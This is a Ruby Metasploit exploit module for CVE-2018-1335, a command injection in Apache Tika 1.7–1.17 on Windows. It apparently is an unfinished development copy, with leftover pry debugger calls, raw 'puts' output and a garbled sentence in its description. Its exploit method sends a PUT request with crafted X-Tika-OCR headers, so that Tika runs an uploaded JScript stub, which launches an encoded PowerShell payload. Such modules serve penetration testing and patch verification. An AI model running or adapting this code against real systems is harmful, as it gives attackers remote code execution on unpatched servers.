require 'pry'
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Tika Header Command Injection',
      'Description'    => %q{
          This module exploits a command injection vulnerability in Apache
        Tika 1.7-1.17 on Windows.  A file with the image/jp2 content-type is
        used to bypass magic bytes checking.  When OCR is specified in the
        request, parameters can be passed to change the parameters passed
        at command line to allow for arbitrary JScript to execute.  A
        JScript stub is passed to execute arbitrary code.
        When a This module was verified against version
        1.17 on Windows 2012.
      },
      'License'        => MSF_LICENSE,
      'Privileged'     => false,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Automatic', {'Arch' => [ARCH_X86, ARCH_X64]}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 25 2018',
      'Author' =>
        [
          'h00die', # msf module
          'David Yesland @Daveysec', #edb submission
          'Tim Allison @_tallison' #discovery
        ],
      'References' =>
        [
          ['EDB', '46540'],
          ['URL', 'https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/'],
          ['URL', 'https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E'],
          ['CVE', '2018-1335']
        ]))

    register_options(
      [
        Opt::RPORT(9998),
        OptString.new('TARGETURI', [true, 'The base path to the web application', '/'])
      ])
  end

  def check
    # binding.pry
    res = send_request_cgi({'uri' => normalize_uri(target_uri, 'version')})
    puts res.inspect
    case res
    when nil
      print_error('No server response.')
    when ->(r) { r.code != 200 }
      print_error("Server response code = #{res.code}.")
      CheckCode::Unknown
    when ->(r) { r.body =~ /Apache Tika (\d\.\d+)/ }
      check_version($1)
    else
      print_error('Invalid server response.')
      CheckCode::Unknown
    end
  end

  def check_version(v)
    print_status('Apache Tika vulnerable versions: 1.7 - 1.17')
    print_status("Apache Tika version detected: #{v}")
    if Gem::Version.new(v).between?(Gem::Version.new('1.7'), Gem::Version.new('1.17'))
      CheckCode::Vulnerable
    else
      CheckCode::Safe
    end
  end

  def exploit
    # binding.pry
    endpoint = normalize_uri(target_uri, 'meta')

    psh = cmd_psh_payload(payload.encoded, payload_instance.arch.first,
            remove_comspec: true,
            encode_final_payload: true
          )
    payld = <<~EOF
      var oShell = WScript.CreateObject('WScript.Shell');
      var oExec  = oShell.Exec('cmd /c #{psh}')
    EOF

    # binding.pry

    print_status("Sending PUT request to #{peer}#{endpoint}")
    res = send_request_cgi({
             'method' => 'PUT',
             'uri'    => endpoint,
             'headers' => {
                "X-Tika-OCRTesseractPath" => '"cscript"',
                "X-Tika-OCRLanguage"      => "//E:JScript",
                "Expect"                  => "100-continue",
                "Content-Type"            => "image/jp2",
                "Connection"              => "close"},
             'data' => payld
           })

    # print_status(res.body)

    puts res.inspect

    case res
    when nil
      print_error('No server response.')
    when ->(r) { r.code != 200 }
      print_error("Server response code = #{res.code}.")
    when ->(r) { !r.body.include?('org.apache.tika.parser') }
      print_error('Invalid server response.')
    end

    # unless res
    #   print_error('No server response, check configuration')
    #   return
    # end
    # unless (res.code == 200 && res.body.include?('tika'))
    #   print_error('Invalid response received, target may not be vulnerable')
    # end
  end
end
